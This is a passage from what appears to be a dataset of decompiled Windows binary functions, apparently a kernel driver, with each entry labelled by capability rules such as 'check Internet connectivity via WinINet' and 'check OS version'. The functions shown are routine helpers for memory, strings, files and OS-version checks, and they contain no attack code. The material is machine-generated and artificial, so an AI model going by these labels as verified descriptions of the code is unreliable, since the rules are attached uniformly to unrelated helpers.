        "decompiled_code": "\nint32_t __cdecl fcn.00034aa0(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint *var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_4h;\n    \n    var_30h = fcn.00037260(&var_10h);\n    if (var_30h == 0) {\n        var_4h = var_30h;\n        iVar1 = fcn.000379d0(arg_ch);\n        iVar1 = fcn.000356c0(iVar1 << 1);\n        if (iVar1 == 0) {\n            var_4h = -0x3fffff66;\n        }\n        else {\n            fcn.00037880(arg_ch, iVar1, 0xffffffff);\n            fcn.000789c0(&var_ch, iVar1);\n            var_28h = 0x18;\n            var_24h = 0;\n            var_1ch = 0;\n            var_20h = &var_ch;\n            var_18h = var_10h;\n            var_14h = 0;\n            var_4h = fcn.000205c0(arg_8h, 0x1f0001, &var_28h, 0);\n        }\n        fcn.000357f0(iVar1);\n        fcn.000373e0(var_10h);\n        if (var_4h == 0) {\n            var_30h = 0;\n        }\n        else {\n            var_30h = fcn.00078a2c(var_4h);\n        }\n    }\n    return var_30h;\n}\n",
        "token_count": 424
    },
    "00034b90": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00034b90(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint uVar3;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint *var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    \n    uVar3 = 0;\n    uVar2 = arg_ch;\n    iVar1 = fcn.000379d0(arg_ch);\n    iVar1 = fcn.000356c0(iVar1 << 1);\n    if (iVar1 == 0) {\n        uVar2 = fcn.00078a2c(0xc000009a, uVar2, uVar3);\n    }\n    else {\n        fcn.00037880(arg_ch, iVar1, 0xffffffff);\n        fcn.000789c0(&var_8h, iVar1);\n        var_24h = 0x18;\n        var_20h = 0;\n        var_18h = 0;\n        var_1ch = &var_8h;\n        var_14h = 0;\n        var_10h = 0;\n        var_ch = fcn.00020610(arg_8h, 0x1f0001, &var_24h);\n        fcn.000357f0(iVar1);\n        if (var_ch == 0) {\n            uVar2 = 0;\n        }\n        else {\n            uVar2 = fcn.00078a2c(var_ch);\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 381
    },
    "00034cb0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00034cb0(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    var_10h = 0;\n    var_ch = 0;\n    iVar1 = fcn.00078a62(*arg_8h, 0, &var_10h);\n    return iVar1 == 0;\n}\n",
        "token_count": 97
    },
    "00034cf0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00034cf0(int32_t arg_8h, int32_t *arg_ch)\n\n{\n    uint uVar1;\n    int32_t arg_8h_00;\n    int32_t iVar2;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_ch = 0x4000;\n    if (arg_ch == NULL) {\n        uVar1 = 0x21590066;\n    }\n    else {\n        do {\n            arg_8h_00 = fcn.000356c0(var_ch);\n            if (arg_8h_00 == 0) {\n                return 0x21590004;\n            }\n            iVar2 = fcn.00078b16();\n            if (iVar2 == -0x3ffffffc) {\n                fcn.000357f0(arg_8h_00);\n                if ((arg_8h == 6) || (arg_8h == 0xb)) {\n                    var_ch = var_4h;\n                }\n                else {\n                    var_ch = var_ch << 1;\n                }\n            }\n        } while (iVar2 == -0x3ffffffc);\n        if (iVar2 == 0) {\n            *arg_ch = arg_8h_00;\n            uVar1 = 0;\n        }\n        else {\n            fcn.000357f0(arg_8h_00);\n            uVar1 = 0xffffffff;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 340
    },
    "00034db0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_14h\n\nint32_t __cdecl fcn.00034db0(int32_t arg_8h, uint32_t *arg_ch, uint32_t *arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t var_14h;\n    uint32_t *var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    uint32_t *var_4h;\n    \n    if (arg_8h == 0) {\n        var_14h = 0x21590065;\n    }\n    else if (arg_ch == NULL) {\n        var_14h = 0x21590066;\n    }\n    else if (arg_10h == NULL) {\n        var_14h = 0x21590067;\n    }\n    else {\n        iVar1 = fcn.00035380(arg_8h, 0x2e);\n        if (iVar1 == 0) {\n            var_14h = 0x21590065;\n        }\n        else {\n            var_8h = fcn.000353c0(arg_8h);\n            var_14h = fcn.00034cf0(0xb, &var_10h);\n            if (var_14h == 0) {\n                var_4h = var_10h + 1;\n                var_14h = 0x21590005;\n                for (var_ch = 0; var_ch < *var_10h; var_ch = var_ch + 1) {\n                    if (((var_ch == 0) && (iVar1 = fcn.000352a0(arg_8h, 0x8005181c, var_8h),  iVar1 == 0)) ||\n                       ((var_ch == 1 && (iVar1 = fcn.000352a0(arg_8h, 0x800547b8, var_8h),  iVar1 == 0)))) {\ncode_r0x00034ec2:\n                        iVar1 = fcn.000352a0(arg_8h, 0x80051918, var_8h);\n                        if ((iVar1 != 0) || (var_4h[var_ch * 0x47 + 2] < 0x80000001)) {\n                            *arg_ch = var_4h[var_ch * 0x47 + 2];\n                            *arg_10h = var_4h[var_ch * 0x47 + 3];\n                            var_14h = 0;\n                            break;\n                        }\n                    }\n                    else {\n                        var_14h = var_8h;\n                        iVar1 = fcn.000352a0(var_4h + *(var_4h + var_ch * 0x11c + 0x1a) + var_ch * 0x11c + 0x1c, arg_8h\n                                             , var_8h);\n                        if (iVar1 == 0) goto code_r0x00034ec2;\n                    }\n                }\n                fcn.000357f0(var_10h);\n            }\n        }\n    }\n    return var_14h;\n}\n",
        "token_count": 697
    },
    "00034fb0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00034fb0(int32_t arg_8h, int32_t arg_ch)\n\n{\n    if ((arg_8h != arg_ch) && (arg_ch != 0)) {\n        fcn.000789b4(arg_ch);\n    }\n    return;\n}\n",
        "token_count": 63
    },
    "00034fd0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00034fd0(int16_t *arg_8h, uint32_t arg_ch)\n\n{\n    int16_t iVar1;\n    uint uVar2;\n    uint var_4ch;\n    int16_t *var_48h;\n    int16_t *var_44h;\n    uint var_40h;\n    int16_t *var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint *var_2ch;\n    \n    if ((arg_8h == NULL) || (arg_ch < 5)) {\n        uVar2 = 0x21590008;\n    }\n    else {\n        fcn.00078bfa(&var_38h, 0, 0x38);\n        var_44h = 0x800547ac;\n        var_48h = arg_8h;\n        do {\n            iVar1 = *var_44h;\n            *var_48h = iVar1;\n            var_44h = var_44h + 1;\n            var_48h = var_48h + 1;\n        } while (iVar1 != 0);\n        var_3ch = arg_8h + 4;\n        var_40h._0_2_ = 0;\n        var_40h._2_2_ = arg_ch * 2 + -8;\n        var_34h = 0x24;\n        var_30h = 0x800547c0;\n        var_2ch = &var_40h;\n        uVar2 = fcn.00078aec(3, 0, &var_38h, 0, 0);\n        uVar2 = fcn.00078a2c(uVar2);\n    }\n    return uVar2;\n}\n",
        "token_count": 407
    },
    "00035090": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00035090(int32_t arg_8h, int32_t arg_ch, uint arg_10h, int32_t *arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t var_8h;\n    uint var_4h;\n    \n    if (((arg_8h == 0) || (arg_ch == 0)) || (arg_14h == NULL)) {\n        var_8h = -0x3ffffff3;\n    }\n    else {\n        *arg_14h = &var_8h;\n        var_8h = fcn.00078b1c(arg_8h, arg_ch, arg_10h, *arg_14h, 0, &var_4h);\n        if ((var_8h == -0x3fffffdd) || (var_8h == -0x7ffffffb)) {\n            iVar1 = fcn.000356c0(var_4h);\n            *arg_14h = iVar1;\n            if (*arg_14h == 0) {\n                var_8h = 0x21590004;\n            }\n            else {\n                var_8h = fcn.00078b1c(arg_8h, arg_ch, arg_10h, *arg_14h, var_4h, &var_4h);\n                if (var_8h != 0) {\n                    fcn.000357f0(*arg_14h);\n                }\n            }\n        }\n    }\n    return var_8h;\n}\n",
        "token_count": 341
    },
    "00035150": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.00035150(void)\n\n{\n    int32_t iVar1;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    iVar1 = *0x800ce6f0;\n    if (*0x800ce6f0 == 0) {\n        fcn.00078af2(&var_ch, &var_8h, 0, 0);\n        iVar1 = fcn.00078a50(0xffffffff, 0x1a, &var_4h, 4, 0);\n        if (iVar1 != 0) {\n            var_4h = 0;\n        }\n        if (var_ch == 4) {\n            if (var_8h == 0) {\n                *0x800ce6f0 = 2;\n                iVar1 = *0x800ce6f0;\n            }\n            else {\n                *0x800ce6f0 = 1;\n                iVar1 = *0x800ce6f0;\n            }\n        }\n        else if (var_ch == 5) {\n            if (var_8h == 0) {\n                *0x800ce6f0 = 3;\n                iVar1 = 3;\n            }\n            else if (var_8h == 1) {\n                *0x800ce6f0 = (-(var_4h != 0) & 10) + 9;\n                iVar1 = *0x800ce6f0;\n            }\n            else if (var_8h == 2) {\n                *0x800ce6f0 = (-(var_4h != 0) & 9) + 0xe;\n                iVar1 = *0x800ce6f0;\n            }\n            else {\n                iVar1 = 0;\n            }\n        }\n        else if (var_ch == 6) {\n            if (var_8h == 0) {\n                *0x800ce6f0 = (-(var_4h != 0) & 0xb) + 0x1b;\n                iVar1 = *0x800ce6f0;\n            }\n            else if (var_8h == 1) {\n                *0x800ce6f0 = (-(var_4h != 0) & 0xb) + 0x23;\n                iVar1 = *0x800ce6f0;\n            }\n            else {\n                iVar1 = 0;\n            }\n        }\n        else {\n            iVar1 = 0;\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 591
    },
    "000352a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.000352a0(uint8_t *arg_8h, uint8_t *arg_ch, int32_t arg_10h)\n\n{\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    var_4h = 0;\n    var_8h = 0;\n    while (arg_10h != 0) {\n        var_4h = *arg_8h;\n        arg_8h = arg_8h + 1;\n        if ((0x40 < var_4h) && (var_4h < 0x5b)) {\n            var_4h = var_4h + 0x20;\n        }\n        var_8h = *arg_ch;\n        arg_ch = arg_ch + 1;\n        if ((0x40 < var_8h) && (var_8h < 0x5b)) {\n            var_8h = var_8h + 0x20;\n        }\n        if ((var_4h == 0) || (arg_10h = arg_10h + -1,  var_4h != var_8h)) break;\n    }\n    return var_4h - var_8h;\n}\n",
        "token_count": 275
    },
    "00035340": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00035340(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int32_t var_4h;\n    \n    for (var_4h = arg_10h; var_4h != 0; var_4h = var_4h + -1) {\n        *(arg_8h + var_4h + -1) = *(arg_ch + var_4h + -1);\n    }\n    return arg_8h;\n}\n",
        "token_count": 118
    },
    "00035400": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.00035400(uint param_1, uint param_2, uint param_3, int32_t param_4, int32_t *param_5, int32_t param_6)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint var_8h;\n    uint var_ch;\n    uint var_10h;\n    int32_t var_14h;\n    int32_t *var_18h_2;\n    int32_t var_1ch_2;\n    uint var_18h;\n    int32_t var_48h;\n    int32_t var_44h;\n    int32_t var_40h;\n    int32_t var_3ch;\n    uint var_38h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    uchar *puStack28;\n    uint var_10h_2;\n    uint uStack16;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x800b8c78;\n    uStack16 = 0x800b8bf4;\n    var_10h_2 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_10h_2;\n    puStack28 = &stack0xffffffa0;\n    var_1ch = 0;\n    var_20h = 0;\n    var_40h = 0;\n    var_3ch = 0;\n    if (var_14h == 0) {\n        var_48h = 0;\n    }\n    else {\n        var_48h = (**0x8005129c)(var_8h, 0, 0, 0, &var_44h, 0);\n        if (-1 < var_48h) {\n            iVar1 = (**0x800511c0)();\n            if (var_44h == iVar1) {\n                var_48h = 0;\n                var_4h = 1;\n                if (var_1ch_2 == 0) {\n                    fcn.00078be8(var_ch, var_10h, var_14h);\n                }\n                else {\n                    fcn.00078be8(var_10h, var_ch, var_14h);\n                }\n                if (var_18h_2 != NULL) {\n                    *var_18h_2 = var_14h;\n                }\n                var_4h = 0xffffffff;\n            }\n            else {\n                var_20h = (**0x8005128c)(var_10h, var_14h, 0, 0, 0);\n                if (var_20h == 0) {\n                    var_48h = -0x3fffff66;\n                }\n                else {\n                    (**0x800511c4)(var_44h, &var_38h);\n                    var_40h = 1;\n                    var_4h = 0;\n                    (**0x80051298)(var_20h, 0, var_1ch_2 != 0);\n                    var_3ch = 1;\n                    var_1ch = (**0x800510e4)(var_20h, 0, 1, 0, 0, 0x10);\n                    if (var_1ch == 0) {\n                        var_48h = -0x3fffff66;\n                        var_4h = 0xffffffff;\n                    }\n                    else {\n                        if (var_1ch_2 == 0) {\n                            fcn.00078be8(var_ch, var_1ch, var_14h);\n                        }\n                        else {\n                            fcn.00078be8(var_1ch, var_ch, var_14h);\n                        }\n                        var_4h = 0xffffffff;\n                        var_48h = 0;\n                    }\n                }\n            }\n            if (var_1ch != 0) {\n                (**0x800510a8)(var_1ch, var_20h);\n            }\n            if (var_3ch != 0) {\n                (**0x80051294)(var_20h);\n            }\n            if (var_40h != 0) {\n                (**0x800511bc)(&var_38h);\n            }\n            if (var_20h != 0) {\n                (**0x800512a4)(var_20h);\n            }\n            (**0x800512e0)();\n        }\n    }\n    *in_FS_OFFSET = var_10h_2;\n    return var_48h;\n}\n",
        "token_count": 1005
    },
    "000356c0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.000356c0(int32_t arg_8h)\n\n{\n    uint var_4h;\n    \n    if (arg_8h == 0) {\n        var_4h = 0x800ccf12;\n    }\n    else {\n        var_4h = fcn.0001d3f0(1, arg_8h, 0x7346744e);\n    }\n    return var_4h;\n}\n",
        "token_count": 100
    },
    "000356f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.000356f0(int32_t arg_8h)\n\n{\n    uint var_4h;\n    \n    if (arg_8h == 0) {\n        var_4h = 0x800ccf12;\n    }\n    else {\n        var_4h = fcn.0001d3f0(0, arg_8h, 0x7346744e);\n    }\n    return var_4h;\n}\n",
        "token_count": 100
    },
    "00035720": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00035720(int32_t *arg_8h, uint32_t arg_ch, uint32_t arg_10h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    if (arg_10h == 0) {\n        fcn.000357f0(*arg_8h);\n        *arg_8h = 0;\n        uVar1 = 0;\n    }\n    else {\n        iVar2 = fcn.000356f0(arg_10h);\n        if (iVar2 == 0) {\n            uVar1 = 0xffffffff;\n        }\n        else {\n            if (arg_10h < arg_ch) {\n                var_8h = arg_10h;\n            }\n            else {\n                var_8h = arg_ch;\n            }\n            fcn.00078be8(iVar2, *arg_8h, var_8h);\n            fcn.000357f0(*arg_8h);\n            *arg_8h = iVar2;\n            uVar1 = 0;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 258
    },
    "000357b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.000357b0(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    iVar1 = fcn.000356c0(arg_8h * arg_ch);\n    if (iVar1 == 0) {\n        iVar1 = 0;\n    }\n    else {\n        fcn.00078bfa(iVar1, 0, arg_8h * arg_ch);\n    }\n    return iVar1;\n}\n",
        "token_count": 115
    },
    "000357f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.000357f0(int32_t arg_8h)\n\n{\n    if ((arg_8h != 0) && (arg_8h != -0x7ff330ee)) {\n        fcn.0001d430(arg_8h, 0x7346744e);\n    }\n    return;\n}\n",
        "token_count": 74
    },
    "00035820": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nchar * __cdecl fcn.00035820(char *arg_8h)\n\n{\n    char cVar1;\n    char *pcVar2;\n    uint var_20h;\n    char *var_1ch;\n    char *var_18h;\n    uint var_14h;\n    uint var_ch;\n    char *var_8h;\n    uint var_4h;\n    \n    var_8h = arg_8h;\n    do {\n        cVar1 = *var_8h;\n        var_8h = var_8h + 1;\n    } while (cVar1 != '\\0');\n    pcVar2 = fcn.000356c0(var_8h + (1 - (arg_8h + 1)));\n    if (pcVar2 != NULL) {\n        var_18h = arg_8h;\n        var_1ch = pcVar2;\n        do {\n            cVar1 = *var_18h;\n            *var_1ch = cVar1;\n            var_18h = var_18h + 1;\n            var_1ch = var_1ch + 1;\n        } while (cVar1 != '\\0');\n    }\n    return pcVar2;\n}\n",
        "token_count": 266
    },
    "000358b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint16_t * __cdecl fcn.000358b0(int16_t *arg_8h)\n\n{\n    int16_t iVar1;\n    int16_t *piVar2;\n    uint var_20h;\n    int16_t *var_1ch;\n    int16_t *var_18h;\n    uint var_14h;\n    uint var_ch;\n    int16_t *var_8h;\n    uint var_4h;\n    \n    var_8h = arg_8h;\n    do {\n        iVar1 = *var_8h;\n        var_8h = var_8h + 1;\n    } while (iVar1 != 0);\n    piVar2 = fcn.000356c0((var_8h - (arg_8h + 1) >> 1) * 2 + 2);\n    if (piVar2 != NULL) {\n        var_18h = arg_8h;\n        var_1ch = piVar2;\n        do {\n            iVar1 = *var_18h;\n            *var_1ch = iVar1;\n            var_18h = var_18h + 1;\n            var_1ch = var_1ch + 1;\n        } while (iVar1 != 0);\n    }\n    return piVar2;\n}\n",
        "token_count": 284
    },
    "00035b50": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00035b50(uint arg_8h, char *arg_ch)\n\n{\n    char cVar1;\n    uint arg_8h_00;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint *var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_24h;\n    uint var_20h;\n    uint32_t var_18h;\n    uint var_14h;\n    uint var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    cVar1 = *arg_ch;\n    if (cVar1 == 'a') {\n        if (arg_ch[1] != '+') {\n            var_18h = 4;\n        }\n        else {\n            var_18h = 7;\n        }\n        var_4h = arg_ch[1] != '+';\n        var_ch = 3;\n    }\n    else if (cVar1 == 'r') {\n        if (arg_ch[1] == '+') {\n            var_18h = 3;\n            var_4h = 0;\n        }\n        else {\n            var_18h = 1;\n            var_4h = 3;\n        }\n        var_ch = 1;\n    }\n    else {\n        if (cVar1 != 'w') {\n            fcn.000359a0(0x16);\n            return 0;\n        }\n        if (arg_ch[1] == '+') {\n            var_18h = 3;\n        }\n        else {\n            var_18h = 2;\n        }\n        var_4h = 0;\n        var_ch = 5;\n    }\n    var_8h = fcn.000356c0(0x208);\n    if (var_8h == 0) {\n        var_40h = 0;\n    }\n    else {\n        fcn.00036890(var_8h, 0x104, arg_8h);\n        fcn.000789c0(&var_20h, var_8h);\n        var_3ch = 0x18;\n        var_38h = 0;\n        var_30h = 0x40;\n        var_34h = &var_20h;\n        var_2ch = 0;\n        var_28h = 0;\n        var_24h = fcn.0001f080(&var_40h, var_18h | 0x100000, &var_3ch, &var_14h, 0, 0x80, var_4h, var_ch, 0x10, 0, 0);\n        fcn.000357f0(var_8h);\n        if (var_24h != 0) {\n            arg_8h_00 = fcn.00078a2c(var_24h);\n            fcn.000359a0(arg_8h_00);\n            var_40h = 0;\n        }\n    }\n    return var_40h;\n}\n",
        "token_count": 693
    },
    "00035d00": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00035d00(uint arg_8h, uint32_t arg_ch, int32_t arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    uint arg_8h_00;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_ch = 0xffffffff;\n    var_10h = 0xfffffffe;\n    iVar1 = fcn.000789e4(arg_14h, 0, 0, 0, &var_8h, arg_8h, arg_ch * arg_10h, &var_10h, 0);\n    if (iVar1 == 0) {\n        var_4h = var_4h / arg_ch;\n    }\n    else {\n        arg_8h_00 = fcn.00078a2c(iVar1);\n        fcn.000359a0(arg_8h_00);\n        var_4h = 0;\n    }\n    return var_4h;\n}\n",
        "token_count": 247
    },
    "00035d70": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00035d70(uint arg_8h, uint32_t arg_ch, int32_t arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    uint arg_8h_00;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_ch = 0xffffffff;\n    var_10h = 0xfffffffe;\n    iVar1 = fcn.00078a56(arg_14h, 0, 0, 0, &var_8h, arg_8h, arg_ch * arg_10h, &var_10h, 0);\n    if (iVar1 == 0) {\n        var_4h = var_4h / arg_ch;\n    }\n    else {\n        arg_8h_00 = fcn.00078a2c(iVar1);\n        fcn.000359a0(arg_8h_00);\n        var_4h = 0;\n    }\n    return var_4h;\n}\n",
        "token_count": 247
    },
    "00035df0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00035df0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_24h;\n    uint var_20h;\n    uint var_18h;\n    uint var_8h;\n    \n    iVar1 = fcn.00078a38(arg_8h, &var_8h, &var_20h, 0x18, 5);\n    if (iVar1 != 0) {\n        var_18h = 0xffffffff;\n    }\n    return var_18h;\n}\n",
        "token_count": 120
    },
    "00035e20": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00035e20(uint arg_8h, uint32_t arg_ch)\n\n{\n    uint arg_8h_00;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint *var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_24h;\n    uint var_20h;\n    uint32_t var_18h;\n    uint var_14h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_18h = 0;\n    var_4h = 0;\n    var_ch = 1;\n    if ((arg_ch & 8) != 0) {\n        var_18h = 4;\n    }\n    if (((arg_ch & 0x100) != 0) && (var_ch = 3,  (arg_ch & 0x400) != 0)) {\n        var_ch = 2;\n    }\n    if ((arg_ch & 3) == 0) {\n        var_18h = var_18h | 1;\n        var_4h = 3;\n    }\n    if ((arg_ch & 2) != 0) {\n        var_18h = var_18h | 3;\n    }\n    if ((arg_ch & 0x200) != 0) {\n        var_ch = 5;\n    }\n    if ((arg_ch & 1) != 0) {\n        var_18h = var_18h & 0xfffffffe | 2;\n    }\n    var_8h = fcn.000356c0(0x208);\n    if (var_8h == 0) {\n        var_40h = 0xffffffff;\n    }\n    else {\n        fcn.00036970(var_8h, 0x104, arg_8h);\n        fcn.000789c0(&var_20h, var_8h);\n        var_3ch = 0x18;\n        var_38h = 0;\n        var_30h = 0x40;\n        var_34h = &var_20h;\n        var_2ch = 0;\n        var_28h = 0;\n        var_24h = fcn.0001f080(&var_40h, var_18h | 0x100000, &var_3ch, &var_14h, 0, 0x80, var_4h, var_ch, 0x10, 0, 0);\n        